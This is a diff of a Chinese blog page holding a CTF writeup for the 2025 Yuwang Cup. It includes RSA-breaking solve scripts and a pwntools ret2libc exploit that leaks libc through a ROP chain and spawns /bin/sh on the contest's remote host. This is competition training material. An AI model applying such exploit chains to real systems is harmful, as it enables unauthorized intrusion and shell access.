@@ -19,80 +19,24 @@
   <meta name="author" content="XU17">
   <meta name="keywords" content="">
   
-    <meta name="description" content="2025御网杯WriteupCrypto1、baby_rsa 1234567891011121314151617181920212223242526272829303132333435363738from gmpy2 import iroot, next_prime, invert, powmodfrom Crypto.Util.number import long_to_bytesdef fac">
+    <meta name="description" content="2025第九届御网杯线上赛Writeup">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XU17">
-<meta property="og:url" content="https://xu17.top/2025/05/11/2025%E5%BE%A1%E7%BD%91%E6%9D%AF/index.html">
+<meta property="og:title" content="2025第九届御网杯线上赛Writeup">
+<meta property="og:url" content="https://xu17.top/2025/05/11/2025%E5%BE%A1%E7%BD%91%E6%9D%AFWriteup/index.html">
 <meta property="og:site_name" content="XU17">
-<meta property="og:description" content="2025御网杯WriteupCrypto1、baby_rsa 1234567891011121314151617181920212223242526272829303132333435363738from gmpy2 import iroot, next_prime, invert, powmodfrom Crypto.Util.number import long_to_bytesdef fac">
+<meta property="og:description" content="2025第九届御网杯线上赛Writeup">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737222.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737073.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737314.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737744.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737337.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737854.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738263.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737078.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737770.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737936.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737691.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737791.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737881.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737133.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737077.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737734.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737222.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737073.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737533.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737046.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737740.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737956.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737859.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738638.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738186.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738079.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738226.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738825.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738394.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738999.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738320.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738004.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738426.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738061.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738831.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738022.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738470.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738993.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738218.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738231.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738833.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738752.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738664.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738899.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738914.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738619.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738118.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738174.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738441.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738626.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738399.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738744.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738905.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738202.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738795.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738229.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738965.png">
-<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111738669.png">
-<meta property="article:published_time" content="2025-05-11T09:46:25.755Z">
-<meta property="article:modified_time" content="2025-05-11T09:46:13.411Z">
+<meta property="og:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111757648.png">
+<meta property="article:published_time" content="2025-05-11T10:20:00.000Z">
+<meta property="article:modified_time" content="2025-05-11T10:03:48.193Z">
 <meta property="article:author" content="XU17">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737222.png">
+<meta name="twitter:image" content="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111757648.png">
   
   
   
-  <title>XU17</title>
+  <title>2025第九届御网杯线上赛Writeup - XU17</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -277,13 +221,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412281014683.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111757648.png') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text=""></span>
+            <span id="subtitle" data-typed-text="2025第九届御网杯线上赛Writeup"></span>
           
         </div>
 
@@ -294,8 +238,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-11 17:46" pubdate>
-          2025年5月11日 下午
+        <time datetime="2025-05-11 18:20" pubdate>
+          2025年5月11日 晚上
         </time>
       </span>
     
@@ -363,15 +307,19 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header"></h1>
+            <h1 id="seo-header">2025第九届御网杯线上赛Writeup</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="2025御网杯Writeup"><a href="#2025御网杯Writeup" class="headerlink" title="2025御网杯Writeup"></a>2025御网杯Writeup</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1、baby-rsa"><a href="#1、baby-rsa" class="headerlink" title="1、baby_rsa"></a>1、baby_rsa</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737222.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+                <h1 id="2025御网杯Writeup"><a href="#2025御网杯Writeup" class="headerlink" title="2025御网杯Writeup"></a>2025御网杯Writeup</h1><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111757648.png" srcset="/img/loading.gif" lazyload alt="image-20250511175742384"></p>
+<ul>
+<li>根本来不及写<code>wp</code>，急死我了<code>QAQ</code></li>
+</ul>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="1、baby-rsa"><a href="#1、baby-rsa" class="headerlink" title="1、baby_rsa"></a>1、baby_rsa</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111749741.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> iroot, next_prime, invert, powmod<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">factor_n</span>(<span class="hljs-params">n</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Attempt to factor n by taking square root and finding next prime&quot;&quot;&quot;</span><br>    root = iroot(n, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>    p = next_prime(root)<br>    q = n // p<br>    <span class="hljs-keyword">return</span> p, q<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext, e, p, q</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Decrypt RSA ciphertext given p and q&quot;&quot;&quot;</span><br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = invert(e, phi)<br>    plaintext = powmod(ciphertext, d, p * q)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Given values</span><br>    n = <span class="hljs-number">12194420073815392880989031611545296854145241675320130314821394843436947373331080911787176737202940676809674543138807024739454432089096794532016797246441325729856528664071322968428804098069997196490382286126389331179054971927655320978298979794245379000336635795490242027519669217784433367021578247340154647762800402140321022659272383087544476178802025951768015423972182045405466448431557625201012332239774962902750073900383993300146193300485117217319794356652729502100167668439007925004769118070105324664379141623816256895933959211381114172778535296409639317535751005960540737044457986793503218555306862743329296169569</span><br>    e = <span class="hljs-number">65537</span><br>    c = <span class="hljs-number">4504811333111877209539001665516391567038109992884271089537302226304395434343112574404626060854962818378560852067621253927330725244984869198505556722509058098660083054715146670767687120587049288861063202617507262871279819211231233198070574538845161629806932541832207041112786336441975087351873537350203469642198999219863581040927505152110051313011073115724502567261524181865883874517555848163026240201856207626237859665607255740790404039098444452158216907752375078054615802613066229766343714317550472079224694798552886759103668349270682843916307652213810947814618810706997339302734827571635179684652559512873381672063</span><br><br>    <span class="hljs-comment"># Factor n</span><br>    p, q = factor_n(n)<br>    <br>    <span class="hljs-comment"># Verify factorization</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;p = <span class="hljs-subst">&#123;p&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;q = <span class="hljs-subst">&#123;q&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Verification: p*q == n? <span class="hljs-subst">&#123;p*q == n&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># Decrypt</span><br>    plaintext = decrypt(c, e, p, q)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted message:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(long_to_bytes(plaintext))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737073.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111749379.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <h3 id="2、cry-rsa"><a href="#2、cry-rsa" class="headerlink" title="2、cry_rsa"></a>2、cry_rsa</h3><p><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505111737314.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>以下是计算RSA私钥指数 <code>d</code> 并生成flag的Python脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> math<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extended_gcd</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> (a, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        g, x, y = extended_gcd(b, a % b)<br>        <span class="hljs-keyword">return</span> (g, y, x - (a // b) * y)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">modinv</span>(<span class="hljs-params">a, m</span>):<br>    g, x, y = extended_gcd(a, m)<br>    <span class="hljs-keyword">if</span> g != <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>  <span class="hljs-comment"># No inverse exists if a and m are not coprime</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> x % m<br><br><span class="hljs-comment"># Given values</span><br>p = <span class="hljs-number">473398607161</span><br>q = <span class="hljs-number">4511491</span><br>e = <span class="hljs-number">19</span><br><br><span class="hljs-comment"># Calculate n and φ(n)</span><br>n = p * q<br>phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Compute d (modular inverse of e mod φ(n))</span><br>d = modinv(e, phi_n)<br><br><span class="hljs-keyword">if</span> d <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>    flag = d + <span class="hljs-number">8</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;d = <span class="hljs-subst">&#123;d&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;flag = flag&#123;&#123;<span class="hljs-subst">&#123;flag&#125;</span>&#125;&#125;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No modular inverse exists for the given e and φ(n).&quot;</span>)<br></code></pre></td></tr></table></figure>
@@ -598,6 +546,8 @@
 <li>EXP</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup_context</span>():<br>    context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_connections</span>():<br>    p = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    p = remote(<span class="hljs-string">&quot;47.105.113.86&quot;</span>, <span class="hljs-number">30003</span>)<br>    <span class="hljs-keyword">return</span> p<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_binaries</span>():<br>    elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    libc = ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    <span class="hljs-keyword">return</span> elf, libc<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_first_payload</span>(<span class="hljs-params">elf</span>):<br>    gadgets = &#123;<br>        <span class="hljs-string">&#x27;pop_rdi&#x27;</span>: <span class="hljs-number">0x4012c3</span>,<br>        <span class="hljs-string">&#x27;pop_rsi_r15&#x27;</span>: <span class="hljs-number">0x4012c1</span>,<br>        <span class="hljs-string">&#x27;main_addr&#x27;</span>: <span class="hljs-number">0x4011DD</span>,<br>        <span class="hljs-string">&#x27;ret&#x27;</span>: <span class="hljs-number">0x40101a</span><br>    &#125;<br>    <br>    payload = flat(<br>        <span class="hljs-number">0x28</span> * <span class="hljs-string">b&#x27;a&#x27;</span>,<br>        p64(gadgets[<span class="hljs-string">&#x27;ret&#x27;</span>]),<br>        p64(gadgets[<span class="hljs-string">&#x27;pop_rdi&#x27;</span>]), p64(<span class="hljs-number">2</span>),<br>        p64(gadgets[<span class="hljs-string">&#x27;pop_rsi_r15&#x27;</span>]), p64(elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]), p64(<span class="hljs-number">0</span>),<br>        p64(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]),<br>        p64(gadgets[<span class="hljs-string">&#x27;main_addr&#x27;</span>])<br>    )<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_final_payload</span>(<span class="hljs-params">libc_base, libc</span>):<br>    system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>    <br>    payload = flat(<br>        <span class="hljs-number">0x28</span> * <span class="hljs-string">b&#x27;a&#x27;</span>,<br>        p64(<span class="hljs-number">0x40101a</span>),  <span class="hljs-comment"># ret for stack alignment</span><br>        p64(<span class="hljs-number">0x4012c3</span>),  <span class="hljs-comment"># pop rdi</span><br>        p64(bin_sh_addr),<br>        p64(system_addr)<br>    )<br>    <span class="hljs-keyword">return</span> payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    setup_context()<br>    p = init_connections()<br>    elf, libc = load_binaries()<br>    <br>    <span class="hljs-comment"># First stage: leak libc address</span><br>    first_payload = build_first_payload(elf)<br>    p.sendlineafter(<span class="hljs-string">&quot;Close your eye, and you are blind now.&quot;</span>, first_payload)<br>    <br>    leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libc_base = leak - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    log.info(<span class="hljs-string">f&quot;Leaked write@GLIBC: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(leak)&#125;</span>&quot;</span>)<br>    log.info(<span class="hljs-string">f&quot;Calculated libc base: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-comment"># Second stage: get shell</span><br>    final_payload = build_final_payload(libc_base, libc)<br>    p.sendline(final_payload)<br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>
+
+
                 
               </div>
             
@@ -605,6 +555,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF-Writeup/" class="category-chain-item">CTF-Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+    </div>
   
 </div>
 
@@ -614,8 +592,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div></div>
-      <div>https://xu17.top/2025/05/11/2025御网杯/</div>
+      <div>2025第九届御网杯线上赛Writeup</div>
+      <div>https://xu17.top/2025/05/11/2025御网杯Writeup/</div>
     </div>
     <div class="license-meta">
       
